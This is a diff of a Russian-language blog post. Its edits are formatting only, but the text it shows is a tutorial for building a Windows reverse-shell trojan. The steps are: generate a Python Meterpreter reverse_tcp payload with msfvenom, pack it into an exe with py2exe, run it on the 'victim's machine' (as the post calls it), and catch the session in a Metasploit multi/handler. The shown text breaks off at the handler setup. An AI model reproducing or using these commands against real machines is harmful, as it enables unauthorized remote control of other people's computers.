@@ -28,7 +28,7 @@ published: true
 
 Общая схема такова: мы генерируем python код с помощью msfvenom, "скармливаем" его py2exe, полученый бинарник запускаем на машине жертвы и ловим сессию.
 
-Для начала установим py2exe под 3.4 версию так как всё что выше не поддерживается.
+Для начала установим py2exe под 3.4 версию так как всё что выше не поддерживается.<br>
 
 
 
@@ -48,18 +48,10 @@ python -3.4 –m pip install py2exe
 
 
 
-Далее создаём .py код:
+Далее создаём .py код:<br>
 ~~~
 msfvenom -p python/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw > payload.py
 ~~~
-
-
-
-
-
-
-
-
 
 
 
@@ -72,24 +64,14 @@ msfvenom -p python/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw > payl
 <br>
 
 
-
-
-
-
-
-
-
-
-
-
 Делаем exe:
-
+<br>
 ~~~
 python34 -m py2exe.build_exe payload.py --bundle-files 0
 ~~~
 
 
-И запускаем его на машине жертвы предварительно запустив handler:
+И запускаем его на машине жертвы предварительно запустив handler:<br>
 ~~~
 msfconsole
 use exploit/multi/handler
